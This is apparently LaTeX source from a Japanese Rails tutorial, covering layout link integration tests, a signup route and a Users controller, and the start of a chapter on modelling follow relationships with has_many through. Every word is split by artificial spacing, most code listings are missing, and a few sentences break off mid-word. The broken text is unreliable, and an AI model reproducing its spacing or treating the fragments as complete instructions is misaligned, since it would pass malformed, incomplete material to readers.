▁ header パーシャル に リンク を追加する
▁ footer パーシャル に リンク を追加する
▁これで 、 レイアウト に 第 \ ref { cha : static _ pages } 章 で作成した すべての 静的ページ へのリンク が できました 。 たとえば \ href { http :// localhost :3000/ about }{/ about } の場合は About ページ ▁( 図 \ ref { fig : about _ page }) ▁ に移動し ます 。
▁\ href { http :// localhost :3000/ about }{/ about } で 表示される About ページ
▁ レイアウト 内の いくつかの リンクを 埋 め る ことができ たので 、 これらの リンク が正しく 動 い ている かどうか チェック する テストを 書い てみましょう 。
▁ ブラウザ を 立 ち 上 げ て ルート URL にアクセス し 、 それぞれの リンク をクリックして 確かめ る こともできます が 、 変更 する 度 に この 作業 を 毎 回 繰り返し て い く のは 大きな 負 担 です 。
▁ そこで 、「 統合テスト ▁(\ emph { ( In te gra tion ▁ Test ) } )」 を使って 一 連 の 作業 を 自動 化 してみましょう 。 統合テスト を使うと 、 アプリケーションの 動作 を 端 から 端 まで ▁( end - to - end ) ▁ シ ミ ュ レ ート して テスト することができます 。
▁まずは 、\ ko de { site \_ layout } という テスト の テンプレート を生成する ところ から 始 め て み ます 。
▁このとき 、 Rails は 与えられた ファイル名 の 末尾 に ▁\ ko de { \_ test } ▁という 文字列 を追加する ことに注目してください 。
▁ 今回の 目的 は 、 アプリケーションの HTML 構造 を調べ て 、 レイアウト の 各 リンク が正しく 動く かどうか チェック することです 。 つまり 、
▁ ルート URL ▁( Home ページ ) ▁ に GET リクエストを 送 る
▁ 正しい ページ テンプレート が 描画 されている かどうか 確かめ る
▁ Home 、 Help 、 About 、 Contact の 各 ページ へのリンク が正しく 動く か 確かめ る
▁Rails の 統合テスト では 、 上の ステップ を コード に 落 と し 込 んで い く ことになります ▁( リスト \ ref { code : layout _ links _ test })。 具体的には 、 まず \ ko de { assert \_ template } メソッドを使って 、 Home ページ が 正しい ビュー を 描画 している かどうか 確かめ ます
▁ 何 人 か の 開発者 は 「 1 つの テスト に 複数の アサーション を 入 れる べ き では ない 」 と 強 く 主 張 する でしょう 。
▁この 演習 は 不 必要 に 複 雑 で 、 も し 各 テスト の 直 前に 共通 の セットアップ 用 タスク があれば 、 た しか に 不要な 負 荷 が か か ること でしょう 。
▁しかし 、 よく 書かれ た テストは 一 貫 した スト ー リ ー のように なり 、 人 間 にとって 理解 し やすい です 。 スト ー リ ー を 独 立 した 場 面 ごとに 分割 され てしまう と 、 物 語 調 ではなく な ってしまいます 。
▁ レイアウト の リンク に対するテスト ▁( ▁\ passing ▁ )
▁リスト \ ref { code : layout _ links _ test } では 、\ ko de { assert \_ select } メソッドの 高度な オプション を使っています ▁( このメソッド 自体 は リスト \ ref { code : title _ tests } や リスト \ ref { code : contact _ page _ test } でも 登 場 しました )。
▁ 今回の ケース では 、 特定の リンク が存在する かどうかを 、\ ko de { a } タグ と \ ko de { href } 属性を オプション で 指定 して 調 べ ています 。 たとえば
▁上のコードでは 、 Rails は自動的に は て な マーク ▁" ? " ▁ を \ ko de { about \_ path } に 置 換 しています ▁( このとき ▁" about \_ path " ▁ 内に 特 殊 記 号 があれば エスケープ 処理 されます )。 これにより 、 次のような HTML がある かどうかを チェック することができます 。
▁ 一方 で 、 ルート URL へのリンク は \ emph { 2 つ } ある ことを思い出してください ▁( 1 つ は ロ ゴ に 、 もう 1 つ は ナビゲーション バー に あります )。 このような と k
▁ といった 風 に 書くこと で 、 リスト \ ref { code : header _ partial _ links } で定義した Home ページの リンク の 個 数 も 調 べ る こともできます
▁\ ko de { assert \_ select } には 色 々 な 指定 の 仕 方 があります 。 その 代 表 例 を いくつか 表 \ ref { table : assert _ select } で 紹 介 します 。
▁ マッチする HTML
▁\ ko de { assert \_ select } の いくつかの 使用 例
▁リスト \ ref { code : layout _ links _ test } で 追加 した 統合テスト が 通 る かどうか は 、 次のように Rake タスク を実行する ことで 試 す ことができます 。
▁ 統合テスト が 成功 した ら 、 今度は すべての テストを 流 して ▁\ passing ▁ する かどうか 確かめ て みてください 。
▁ レイアウト の リンク をテストする 統合テスト が追加され た ことで 、 リンク に 間 違 った 変更 が 加 え られ たら すぐ に 気 付け る ようになりました 。
▁この節では 、 レイアウト と ルーティング の 取り 組 み における 頂 点 として 、 ユーザー登録ページ への ルーティング を作成します 。 そのため に 2 番目の コントローラ を作成する ことになります 。
▁これは 、 Web サイト で ユーザー登録 を 行える ように するための 最初の 重要な 一 歩 となります 。 次の 一 歩 である ユーザーの モデリング は 第 \ ref { cha : modeling _ users } 章 で 行 い 、 第 \ ref { cha : sign _ up } 章 で ユーザー登録 が 完成 します 。
▁< n >< n > ▁\ subsection { Users コントローラ } ▁% ▁( fold )< n > ▁\ label { sec : users _ controller }< n >< n >
▁\ ref { sec : static _ pages } で 、 最初の コントローラ である StaticPages コントローラ を作成し ました 。
▁今度は 2 番目の コントローラ である Users コントローラ を作成し ましょう 。
▁Rails で 好 まれ ている \ href { http :// en . w ikipedia . org / wiki / Re present ation al _ S t at e _ Transfer } { REST アーキテクチャ } の 規 約 に従い 、 新規ユーザー 用の アクション を \ ko de { new } とします 。 したがって 、\ ko de { generate ▁ controller } の 引数に \ ko de { new } を渡して 、 自動的に アクション を作成 してみましょう 。
▁ 変更 の 結果を リスト \ ref { code : generate _ users _ controller } に示します 。
▁ Users コントローラの 生成 ▁(\ ko de { new } アクション を 追加 )
▁create ▁app / controllers / users _ controller . rb
▁invo ke ▁ erb
▁create ▁app / views / users
▁create ▁app / views / users / new . html . erb
▁invo ke ▁ helper
▁create ▁app / helpers / users _ helper . rb
▁invo ke ▁test _ un it
▁invo ke ▁ assets
▁invo ke ▁ coffee
▁create ▁app / assets / javascripts / users . js . coffee
▁invo ke ▁ s css
▁create ▁app / assets / stylesheets / users . css . s css
▁リスト \ ref { code : generate _ users _ controller } により 、\ ko de { new } アクション を持つ Users コントローラ ( リスト \ ref { code : initial _ users _ controller }) と 、 ス タブ のユーザー ビュー を作成します ( リスト \ ref { code : initial _ new _ action })。
▁このとき 、 新しい User ページ 用の 小さな テスト ▁( リスト \ ref { code : user _ new _ test }) ▁ も 生成 されて いて 、 この時点で は パス するはずです 。
▁\ ko de { new } アクション を持つ 最初の Users コントローラ
▁ Users 用の 最初の \ ko de { new } アクション
▁User ページ 用の 最初の テスト
▁\ ref { sec : users _ controller } のコード により 、 新規ユーザー 用の 動作する ページ が / users / new ▁ に できました 。 ここで 表 \ ref { table : url _ m app ing } を 思い 出 して い ただ き たい のですが 、 URL は / users / new ではなく 表 の とおり に / signup に したい と思います 。
▁リスト \ ref { code : static _ page _ routes } の例 に従い 、 ユーザー登録 URL 用 に \ ko de { get ▁ ’ / signup ’ } の ルール を追加します ▁( リスト \ ref { code : signup _ route })。
▁ ユーザー登録ページ の ルート
▁次に 、 新しく 定義された 名前付きルート を使って 、 Home ページの ボタン に 適切な リンクを 追加 す 。
▁ 他の ルート と同様 、\ ko de { get ▁ ’ / signup ’ } と 記述 した ことで \ ko de { signup \_ path } という 名前付きルート が でき 、 それ を リスト \ ref { code : home _ page _ signup _ link } で 使用します 。
▁ signup ページ への テストは 演習 に 回 す ことにします ▁(\ ref { sec : layout _ exercises })。
▁ ボタン に ユーザー登録ページ へのリンク を追加する
▁最後に 、 signup ページ 用の カスタム ス タブ ▁( st ub ) ▁ の ビュー を追加します ▁(\ ref { code : initial _ signup _ page })。
▁ 最初の ユーザー登録ページ ▁( ス タブ )
▁これで 、 少なくとも サインイン の ルート を追加する まで の 間 、 リンク と 名前付きルート が 完成 しました ( 第 \ ref { cha : log _ in _ log _ out } 章 )。
▁ 結果を 図 \ ref { fig : new _ signup _ page } の 新規ユーザー の ページ ▁( U R I ▁ / signup ) ▁ に示します 。
▁\ href { http :// localhost :3000/ signup }{/ signup } で 表示される 新しい ユーザー登録ページ
▁この 章では 、 アプリケーションの レイアウト を 形 に し 、 ルーティング を 洗 練 させ ました 。
▁ 本書 では 、 以後 サンプルアプリケーション を 肉 付け すること に 専 念 します 。 最初に 、 ユーザー登録 、 サインイン 、 サインアウト できる ユーザー を追加します 。 次に 、 マイクロポスト を追加します 。 最後に 、 他の ユーザーを フォロー できるようにします 。
▁ Git を 使っている 方は 、 この時点で master ブランチ に変更 を マージ してください 。
▁続いて 、 Bitbucket に プッシュ します 。
▁最後に 、 Heroku へ デプロイ します 。
▁ デプロイ が 無 事 に 終 わ ると 、 本番環境で サンプルアプリケーション が 動 い ている はずです ▁( 図 \ ref { fig : layout _ production })。
▁ 本番環境で 動く サンプルアプリケーション
▁ 不 具 合 が発生し た場合 は 、 以下の コマンド を 試 してみてください 。
▁上の コマンド を使用して Heroku の ログ ファイル を参照 し 、 エラー を デバッグ してください 。
▁ )< n >< n >\ subsection { 本 章 の まとめ } ▁% ▁( fold )< n >\ label { sec : fi ll ing _ in _ the _ layout _ what _ w e _ learn ed _ in _ this _ chapter }< n >< n >\ begin { item ize }< n >< n >\ item
▁ HTML 5 を使って header や footer 、 log o や body といった コンテンツ の レイアウト を定義し ました
▁Rails の パーシャル は 効率 化 のために 使われ 、 別 ファイルに マークアップ を 切り 出 す ことができます
▁ CSS は 、 CSS クラス と id を使って レイアウト や デザイン を 調 整 します
▁ Bootstrap フレームワーク を使うと 、 い い 感 じ の デザイン を 素 早 く 実装 できる
▁ Sass と Asset ▁Pipeline は 、 ( 開発 効率 のために 切り 分 け られ た ) ▁ CSS の 冗 長 な 部分を 圧 縮 し 、 本番環境 に 最適化 した 結果 を出力する
▁Rails の ルーティング では 自由に ルール を定義する ことができ 、 また 、 その 際に 名前付きルート も 使えるように な る
▁ 統合テスト は 、 ブラウザ による ページ 間 の 遷 移 を 効率 的に シ ミ ュ レ ート する
▁\ ref { sec : sass } で 触 れ た ように 、 まず は リスト \ ref { code : footer _ css } の フ ッ ター 用 CSS を リスト \ ref { code : re factor ed _ s css } の S CSS に変更 してみてください 。
▁リスト \ ref { code : layout _ links _ test } の 統合テスト では 、 ▁\ ko de { get } メソッドを使って ユーザー登録ページ にアクセス し 、 ページ タイトル が 正しい かどうか チェック する テストコード を加え てください 。
▁リスト \ ref { code : test _ helper _ application _ helper } で お 見 せ した ように 、 Application ヘルパー で 使っている \ ko de { full \_ title } ▁ ヘルパー を 、 test 環境で も 使えるように すると 便利です 。
▁ こう しておく と 、 リスト \ ref { code : layout _ links _ test _ signup _ full _ title _ helper } のような コード を使って 正しい タイトル をテストする ことができます ▁( ちなみに これは 前 回 の 演習 の 応 用 で もあります )。
▁ただし 、 これは 完 璧 な テスト ではありません 。 たとえば ベース タイトル に “ Ruby ▁on ▁Rails ▁ T u to i al ” といった 誤 字 が あった として も 、 この テストでは 発 見 すること が できない でしょう 。
▁ この問題 を 解決 するために は 、\ ko de { full \_ title } ヘルパー に対する テストを書く 必要があります 。 そのため に 、 Application ヘルパー をテストする ファイル を作成し 、 リスト \ ref { code : full _ title _ helper _ tests } の \ ko de { F I L L \_ IN } のような コードを 書い てみましょう 。
▁ ヒント : ▁リスト \ ref { code : full _ title _ helper _ tests } では \ ko de { assert \_ equ al ▁< 期 待 される 値 > , ▁< 実際の 値 > } といった 形 で 使って い ましたが 、 内部で は \ ko de { = = } 演算子 を使って 、 期 待 される 値 と 実際の 値を 比 較 して 正しい かどうか テスト しています 。
▁ テスト 環境で も Application ヘルパー を 使えるように する
▁ テスト 環境で \ ko de { full \_ title } ヘルパー を使う
▁\ ko de { full \_ title } ヘルパー のテスト
▁この 章では 、 他の ユーザーを フォロー ▁( および フォロー解除 ) ▁ できる ソ ー シ ャ ル レ イ ヤ ー を追加し 、 各 ユーザーの Home ページに 、 現在 フォロー 中 の ユーザーの ステータスフィード を 表示 できるように して 、 サンプルアプリケーションの コア を 完成 させ ます 。
▁まずは 、 ユーザー 間 の関係 性 を どう モデリング するか について 学 び ます ▁(\ ref { sec : the _ relationship _ model })。 その後 、 ▁A モデリング 結果 に対応する Web イン ター フ ェ ー ス を 実装 していきます ▁(\ ref { sec : a _ web _ in ter fa ce _ for _ following _ and _ followers })。 このとき 、 Web イン ター フ ェ ー ス の例 として Ajax についても 紹 介 します 。
▁最後に 、 ステータスフィード の 完成 版 を 実装します ▁(\ ref { sec : the _ status _ feed })。
▁この 最 終 章では 、 本書 の中で 最も 難 易 度 の 高 い 手法 を いくつか 使用 しています 。 その 中に は 、 ステータスフィード 作成 のために Ruby / SQL を 「 だ ます 」 テクニック も 含 まれ ます 。
▁ この章 の例 全体 に わ た って 、 これまで よりも 複雑な データモデル を使用しています 。 ここで 学 んだ データモデル は 、 今後 自分 用の Web アプリケーションを 開発 するときに 必ず 役 に 立 ち ます 。
▁また 、 本書 を 卒 業 して 実際の 開発 に 携 わ る とき のために 、\ ref { sec : following _ co nclusion } で 役 立 つ リソース 集 ▁( 読み 物 ガイド ) ▁ についても 紹 介 します 。
▁ この章 で 扱 っている 手法 は 本書 全体 の中で 最も 難 易 度 が 高 い ので 、 理解 を 助 け るため 、 コードを 書く 前に は い った ん 立 ち 止 ま って イン ター フ ェ ー ス を 探 検 する ことにします 。
▁ これまで の 章 と同様 、 最初に モックアップ を示します
▁ ページ 操作 の 全体 的な フ ロー は 次の ようになります 。 ある ユーザー ▁( John ▁ Calvin ) ▁ は 自分の プロファイル ページを 最初に 表示 し ▁( 図 \ ref { fig : page _ flow _ profile _ mockup }) 、 フォロー する ユーザーを 選択 するために Users ページ ▁( 図 \ ref { fig : page _ flow _ user _ index _ mockup }) ▁ に移動し ます 。
▁ Calvin は 2 番目の ユーザー T h o ma s ▁ Hobbes ▁( 図 \ ref { fig : page _ flow _ other _ profile _ follow _ button }) ▁ を表示し 、[ Follow ] ▁ ボタン を 押 して フォロー します 。
▁これにより 、[ Follow ] ▁ ボタン が ▁[ U n follow ] ▁ に 変 わ り 、 Hobbes ▁ の ▁[ followers ] ▁ カウント が 1 人 増え ます ▁( 図 \ ref { fig : page _ flow _ other _ profile _ unfollow _ button _ mockup })。
▁ Calvin が Home ページに 戻 ると 、[ following ] ▁ カウント が 1 人 増え 、 Hobbes の マイクロポスト が ステータスフィード に 表示される よう になっている ことがわかります ▁( 図 \ ref { fig : page _ flow _ home _ page _ feed _ mockup })。
▁この節では 、 以後 この フ ロー の 実現 に 専 念 します 。
▁ 現在の プロフィール ページ
▁ フォロー する 相手 を見つけ る
▁ユーザーの プロフィール画面 に ▁[ Follow ] ▁ ボタン が表示されている
▁ プロフィール に ▁[ U n follow ] ▁ ボタン が表示され 、 フォロワー の カウント が 1 つ 増え た
▁ Home ページに ステータスフィード が表示され 、 フォロー の カウント が 1 増え た
▁\ label { fig : page _ flow _ home _ page _ feed _ mockup } }< n >\ end { figure }< n >< n >< n > ▁\ section { Relationship モデル } ▁% ▁( fold )< n > ▁\ label { sec : the _ relationship _ model }< n >< n >
▁ ユーザーを フォロー する 機能 を実装する 第 一 歩 は 、 データモデル を構成する ことです 。 ただし 、 これは 見 た 目 ほど 単 純 ではありません 。
▁ この後 で説明します が 、 この 方法 では た ち ま ち 壁 に 突 き 当 た ってしまいます 。 これを 解決 するための \ ko de { has \_ many ▁ through } ▁( 多 対 多 の関係 を表す の に 使用 ) ▁ についても この後 で説明します 。
▁ Git ユーザー は これまで 同様 新しい トピックブランチ を作成 してください 。
▁ following - users
▁< n >\ end { code }< n >< n > ▁\ subsection { データモデル の 問題 ▁( および 解決 策 ) } ▁% ▁( fold )< n > ▁\ label { sec : a _ pro b le m _ with _ the _ data _ model }< n >< n >
▁ ユーザーを フォロー する データモデル 構成 のための 第 一 歩 として 、 典 型 的な 場合 を 検 討 してみましょう 。
▁ ある ユーザーが 、 別の ユーザーを フォロー している ところ を 考えてみましょう 。 具 体 例 を 挙 げ ると 、 Calvin は Hobbes を フォロー しています 。 これを 逆 から 見 れば 、 Hobbes は Calvin から フォロー されています 。 Calvin は Hobbes から 見 れば \ emph { フォロワー ▁( follower ) } であり 、 Hobbes は Calvin によって \ emph { フォロー されている ▁( followed ) ▁ } ことになります 。
▁Rails における デフォルトの 複数形 の 慣習 に 従 えば 、 ある ユーザーを フォロー している すべての ユーザーの 集合 は \ emph { followers } と なり 、\ ko de { user . followers } は それらの ユーザー の配列 を表す ことになります 。
▁ 残 念 な ことに 、 この 名前 付け は 逆 については うまく い き ません ▁( Rails の という より 英語 の 都 合 ですが )。 フォロー されている すべての ユーザーの 集合 は 、 このままでは \ emph { followed s } と な っ てしまい 、 英語 の 文法 から も 外 れる う え に 非常に 見 苦 しい もの になってしまい ます 。
▁ そこで 、 今 Twitter の 慣習 に なら い 、 本チュートリアルで は \ emph { following } という 呼 称 を 採 用 します ▁( 例 : ▁“ 50 ▁ following , ▁ 7 5 ▁ followers ” )。 したがって 、 ある ユーザーが フォロー している すべての ユーザーの 集合 は \ ko de { c al v in . following } となります 。
▁これにより 、 図 \ ref { fig : n a ive _ user _ has _ many _ following } のように \ ko de { following } テーブル と ▁\ ko de { has \_ many } 関連付け を使用して 、 フォローしているユーザー の モデリング が できます 。
▁ 見え や す く する ため 、 図 \ ref { fig : n a ive _ user _ has _ many _ following } から \ ko de { following } テーブル の \ ko de { id } カラム を省略 しました 。
▁さらに 、 それぞれの 行 は ユーザー なので 、 これらの ユーザーに 名前 や パスワード などの 属性 も 追加 する 必要がある でしょう 。
▁ 図 \ ref { fig : n a ive _ user _ has _ many _ following } の データモデル の 問題 点 は 、 非常に 無 駄 が多い ことです 。 各 行 には 、 フォローしているユーザー の id のみ な らず 、 名前 や メールアドレス まで あります 。 これらは いずれ も \ emph { users } テーブル に \ ko de { 既に ある } もの ば か り です 。
▁さらに よく ないこと に 、\ emph { followers } の 方 を モデリング するときに も 、 同じ ぐらい 無 駄 の 多 い \ ko de { followers } テーブル を 別 に 作成 し なければ なら なく な ってしまいます 。
▁ 結 論 として は 、 この データモデル は メ ン テ ナ ン ス の 観 点 から 見 て 悪 夢 です 。 ユーザー名 を変更する たびに 、\ ko de { users } テーブル の その レコード だけで なく 、\ ko de { following } テーブル と \ ko de { followers } テーブル の 両方 について 、\ emph { その ユーザー を含む すべての 行 { } / } を更新し なければ なら なくなります 。
▁ この問題 の 根 本 は 、 必要な 抽 象 化 を 行 な っ ていない ことです 。
▁ 正しい モデル を見つけ 出 す 方法 の 1 つ は 、 Web アプリケーション における \ emph { following } の動作 を どのように 実装 するか を じ っ く り 考え ること です 。
▁\ ref { sec : a _ users _ resource } において 、 REST アーキテクチャ は 、 作成された り 削除 された り する \ emph { リソース } に 関連 して いた ことを思い出してください 。
▁ ここ から 、 2 つの 疑 問 が生じ ます 。 1 . ▁ ある ユーザーが 別の ユーザーを フォロー する とき 、 何 が 作成される の でしょう か 。
▁2 . ▁ ある ユーザーが 別の ユーザーを フォロー \ emph { 解 除 } する とき 、 何 が 削除 される の でしょう か 。
▁この 点 を 踏 ま え て 考え ると 、 この場合 アプリケーション によって 作成 または 削除 される のは 、 つ ま る ところ 2 人のユーザー の 「\ emph { 関係 ▁( リレーションシップ ) }」 である ことがわかります 。
▁つまり 、 1 人のユーザー は 1 対 多 の関係 を持つ ことができ 、 さらに ユーザー は リレーションシップ \ ko de { を経由して } 多くの \ emph { following } ▁( または \ emph { followers }) ▁ と 関係 を持つ ことができる ということです 。
▁この データモデル には 他にも 解決 し なく て は い け ない 問題 があります 。 F a ce book のような 友 好 関係 ▁( F ri end sh ip s ) ▁ では 本 質 的に 左 右 対 称 の データモデル が 成 り 立 ち ます が 、 Twitter のような フォロー 関係 では \ emph { 左 右 非 対 称 } の 性 質 があります 。 す な わ ち 、 Calvin は Hobbes を フォロー して いて も 、 Hobbes は Calvin を フォロー していない といった 関係 性 が 成 り 立 つの です 。
▁ このような 左 右 非 対 称 な 関係 性 を見 分 け るために 、 それぞれ を \ emph { 能 動的 関係 ▁( Active ▁ Relationship ) } と \ emph { 受 動的 関係 ▁( P as s ive ▁ Relationship ) } と 呼 ぶ ことにします 。 たとえば 先ほど の 事 例 のような 、 Calvin が Hobbes を フォロー している が 、 Hobbes は Calvin を フォロー していない 場合 では 、 Calvin は Hobbes に対して 「 能 動的 関係 」 を 持 っている ことになります 。 逆 に 、 Hobbes は Calvin に対して 「 受 動的 関係 」 を 持 っている ことになります
▁ 読者 の P a ul ▁F i or a v an t i が この 用 語 を 提 案 してくれ ました 。 あり が と う ご ざ います 。
▁まずは 、 フォローしているユーザー を生成する ために 、 能 動的 関係 に 焦 点 を 当 て ていきます ▁( 受 動的 関係 については \ ref { sec : followers } で 考え ていきます )。
▁この データモデル の 模 式 図 に すると 、 図 \ ref { fig : user _ has _ many _ following } のようになります 。
▁ 能 動的 関係 を と お して フォローしているユーザー を 取得 する 模 式 図
▁ 能 動的 関係 も 受 動的 関係 も 、 最終的に は データベースの 同じ テーブル を使う ことになります 。 したがって 、 テーブル 名 には この 「 関係 」 を表す 「\ emph { relationship }」 を 使い ましょう 。 モデル名 も同様に して 、 Relationship モデルと します 。
▁作成した Relationship データモデル を 図 \ ref { fig : relationship _ model } に示します 。
▁1 つの relationship テーブル を使って 2 つの モデル ▁( 能 動的 関係 と 受 動的 関係 ) ▁ を シ ミ ュ レ ート する方法について は 、\ ref { sec : following } で説明します 。
▁ Relationship データモデル
▁この データモデル を実装する ために 、 まず は 次のように 図 \ ref { fig : relationship _ model } に 対応 した マイグレーション を生成します 。
▁self を省略した 結果を リスト \ ref { code : relationships _ migration } に示します 。
▁\ ko de { relationships } テーブル に インデックス を追加する
▁( リスト \ ref { code : email _ uniqueness _ index } で メールアドレス の 一意性 を 保 証 したり 、 リスト \ ref { code : micropost _ migration } で 使 った 複 合 キー インデックス と 比 較 してみてください 。 )
▁もちろん 、 このような 重複 ▁( 2 回 以上 フォロー すること ) ▁ が 起 き ない よう 、 インターフェイス 側 の実装 でも 注意 を 払 います ( \ ref { sec : following })。 しかし 、 ユーザーが 何らかの 方法で ▁( たとえば \ ko de { c url } などの コマンドライン ツール を使用して ) ▁ Relationship の データを 操作 する ようなこと も 起 こ り 得 ます 。 そのような 場合 でも 、 一意 な インデックス を追加し ていれば 、 エラー を 発生 させ て 重複 を防ぐ ことができます 。
▁\ ko de { relationships } テーブル を作成する ために 、 いつものように データベースの マイグレーション を行います 。
▁ フォローしているユーザー と フォロワー を実装する 前に 、 User と Relationship の 関連付け を行います 。
▁1 人のユーザー には \ ko de { has \_ many } ▁( 1 対 多 ) ▁ の リレーションシップ があり 、 この リレーションシップ は \ emph { 2 人 } の ユーザーの 間 の関係 なので 、 フォローしているユーザー と フォロワー の 両方 に 属 します ▁(\ ko de { belongs \_ to })。
▁\ ref { sec : user _ micropost _ association s } の マイクロポストの とき と同様 、 以下のような ユーザー 関連付け のコード を使用して 新しい リレーションシップ を作成します 。
▁ この時点で 、 アプリケーション コードは \ ref { sec : user _ micropost _ association s } の よう になる の では ない か と 予 測 した 方 も いる かもしれません 。 実際 似 ている のですが 、 2 つの 大きな 違 い があります 。
▁まずは 1 つ 目 の違い について です 。 以前 、 ユーザー と マイクロポストの 関連付けを した とき は 、 次のように 書き ました 。
▁ 技術 的に は 、 Rails は \ ko de { has \_ many } に 与えられた 引数 を 、\ ko de { class if y } メソッドを使って クラス名 に変換 しています 。 このメソッドは 、 たとえば \ ko de { " foo \_ bar s "} であれば \ ko de { " F oo B ar "} に変換 します 。
▁ と な っ てしまい 、 ( Active Relationship モデル を探し てしまい ) ▁ Relationship モデル を見つけ ること が できません 。
▁ このため 、 今回の ケース では 、 Rails に 探 して 欲 しい モデルの クラス名 を 明示的に 伝 え る必要があります 。
▁2 つ 目 の違い は 、 先ほど の 逆 の ケース について です 。 以前 は Micropost モデル で
▁この ように 書き ました 。
▁\ ko de { microposts } テーブル には \ ko de { user \_ id } 属性 が あるので 、 これを 辿 って 対応する 所 有 者 ▁( ユーザー ) ▁ を 特 定 すること が できました ▁(\ ref { sec : the _ basic _ model })。
▁ データベースの 2 つの テーブル を 繋 ぐ とき 、 このような id は \ emph { 外部キー ▁( foreign ▁ key ) } と呼びます 。 す な わ ち 、 User モデルに 繋 げ る 外部キー が 、 Micropost モデルの \ ko de { user \_ id } 属性 ということです 。 この 外部キー の名前 を使って 、 Rails は 関連付け の 推測 を しています 。 具体的には 、 Rails はデフォルトで は 外部キー の名前 を \ ko de { < class >\ _ id } といった パターン として 理解 し 、 ▁\ ko de { < class > } に 当 た る 部分 から クラス名 ▁( 正 確 には 小文字 に変換 された クラス名 ) ▁ を 推測 します
▁ 技術 的に は 、 Rails は \ ko de { underscore } メソッドを使用して クラス名 を id に変換 しています 。
▁たとえば 、\ ko de { " F oo B ar ". underscore } を実行すると \ ko de { " foo \_ bar "} に変換 されます 。 従って 、 ▁\ ko de { F oo B ar } オブジェクトの 外部キー は \ ko de { foo \_ bar \_ id } になる でしょう
▁ただし 、 先ほど は ユーザーを 例 として 扱 い ましたが 、 今回の ケース では フォローしているユーザー を \ ko de { follower \_ id } という 外部キー を使って 特 定 し なく て は なり ません 。 また 、 follower という クラス名 は 存在しない ので 、 ここで も Rails に 正しい クラス名 を 伝 え る 必要 が発生し ます 。
▁ 先ほど の 説明 を コード に まとめ ると 、 User と Relationship の 関連付け は リスト \ ref { code : user _ relationships _ association } と リスト \ ref { code : relationship _ belongs _ to } のようになります 。
▁ 能 動的 関係 に対して 1 対 多 ▁(\ ko de { has \_ many }) ▁ の 関連付け を実装する
▁( ユーザーを削除 した ら 、 ユーザーの リレーションシップ も 同時に 削除 される 必要があります 。 そのため 、 関連付け に \ ko de { dependent : ▁: destroy } も 追加 しています 。 )
▁ リレーションシップ / フォロワー に対して \ ko de { belongs \_ to } の 関連付け を追加する
▁なお 、\ ko de { follower } の 関連付け については 、\ ref { sec : following } に 入 る まで は 使い ません 。 しかし follower と followed を 対 称 的に 実装 しておくこと で 、 構造 に対する 理解 は 容易に な る はずです 。
▁リスト \ ref { code : user _ relationships _ association } と リスト \ ref { code : relationship _ belongs _ to } で定義した 関連付け により 、 表 \ ref { table : association _ method s } で 以前 紹 介 した ような 多くの メソッドが 使えるように なりました 。 今回 使えるように な った メソッドを 表 \ ref { table : association _ method s _ relationships } に示します 。
▁ フォロワー を返します
▁ フォローしているユーザー を返します
▁\ ko de { user } と 紐 付け て 能 動的 関係 を作成 / 登録 する
▁\ ko de { user } を 紐 付け て 能 動的 関係 を作成 / 登録 する ▁( 失敗 時に エラー を 出力 )
▁\ ko de { user } と 紐 付け た 新しい Relationship オブジェクト を返す
▁ユーザー と 能 動的 関係 の 関連付け によって 使えるように な った メソッドの まとめ
▁ 先 に進む前に 、 Relationship モデルの 検証 を追加して 完全な もの に しておきましょう 。
▁ テスト ▁( リスト \ ref { code : relationship _ validation _ tests }) と アプリケーション コード ▁( リスト \ ref { code : relationship _ validations }) ▁ は 素 直 な 作り です 。
▁ただし 、 ユーザー 用の fixture ファイル ▁( リスト \ ref { code : default _ fixtures }) ▁ と同じ ように 、 生成された リレーションシップ 用の fixture では 、 マイグレーション ▁( リスト \ ref { code : relationships _ migration }) ▁ で 制 約 させ た 一意性 を 満 た す ことができ ません 。
▁という ことで 、 ユーザー のとき と同じ で ▁( リスト \ ref { code : empty _ fixtures } で fixture の内容 を削除し た ように ) 、 今 の 時点 では 生成された リレーションシップ 用の fixture ファイル も 空 に しておきましょう ▁( リスト \ ref { code : empty _ relationship _ fixture })。
▁ Relationship モデル のバリデーション をテストする
▁ Relationship モデル に対して バリデーション を追加する
▁ Relationship 用の fixture を 空 にする
▁ いよいよ Relationship の 関連付け の 核 心 、\ ko de { following } と \ ko de { followers } に 取り か か ります 。
▁ 今回は \ ko de { has \_ many ▁ through } を使用します 。 図 { p 1 } のように 、 1 人のユーザー には い く つ もの 「 フォロー {3} する / される {/3} ▁( 多 対 多 )」 の リレーションシップ があります 。
▁ デフォルトの \ ko de { has \_ many ▁ through } という 関連付け では 、 Rails は モデル名 ( 単数形 ) に対応する 外部キー を探し ます 。
▁つまり 、 次の コード では 、
▁Rails は “ followed s ” という シンボル 名 を見 て 、 これを “ followed ” という 単数形 の 変え 、 ▁\ ko de { relationships } テーブル の \ ko de { followed \_ id } を使って 対象 のユーザー を取得し て きます 。
▁しかし 、\ ref { sec : a _ pro b le m _ with _ the _ data _ model } で 指 摘 した ように 、\ ko de { user . followed s } という 名前 は 英語 として 不 適 切 です 。 代わりに 、\ ko de { user . following } という 名前 を 使い ましょう 。
▁その ためには 、 Rails の デフォルト を 上 書き する必要があります 。 ここでは \ ko de { : source } パラメータ ー ▁( リスト \ ref { code : has _ many _ following _ through _ active _ relationships }) ▁ を使用し 、 「\ ko de { following } 配列 の 元 は \ ko de { followed } ▁id の 集合 である 」 ということ を 明示的に Rails に 伝 え ます 。
▁User モデルに \ ko de { following } の 関連付け を追加する
▁リスト \ ref { code : has _ many _ following _ through _ active _ relationships } で定義した 関連付け により 、 フォローしているユーザー を 配列 の 様 に 扱 え る ようになりました 。
▁たとえば 、\ ko de { include ?} メソッド ▁(\ ref { sec : array s _ and _ range s }) ▁ を使って フォローしているユーザー の 集合 を調べ て み たり 、 関連付け を通して オブジェクト を探し だ せる ようになります 。
▁\ ko de { following } メソッドで 配列 のように 扱 え る だけで も 便利です が 、 Rails は 単純な 配列 ではなく 、 もっと 賢 く この 集合 を 扱 っています 。
▁たとえば 、 次のような コード では
▁ フォロー している 全 て の ユーザーを データベースから 取得 し 、 その 集合 に対して \ ko de { include ?} メソッドを 実行 している ように 見え ます が 、 しかし 実際には データベース の中で 直接 比 較 を する ように 配 慮 しています 。
▁(\ ref { sec : render ing _ microposts } でも 説明したように 、 次のような コードは
▁ データベース の中で 合 計 を 計算 した ほ う が 高速 になる ことを思い出してください 。 )
▁さらに 、 これ に 関連する \ ko de { following ?} 論理値 メソッド も 追加 し 、 ある ユーザーが 誰 か を フォロー している かどうかを確認 できるようにします
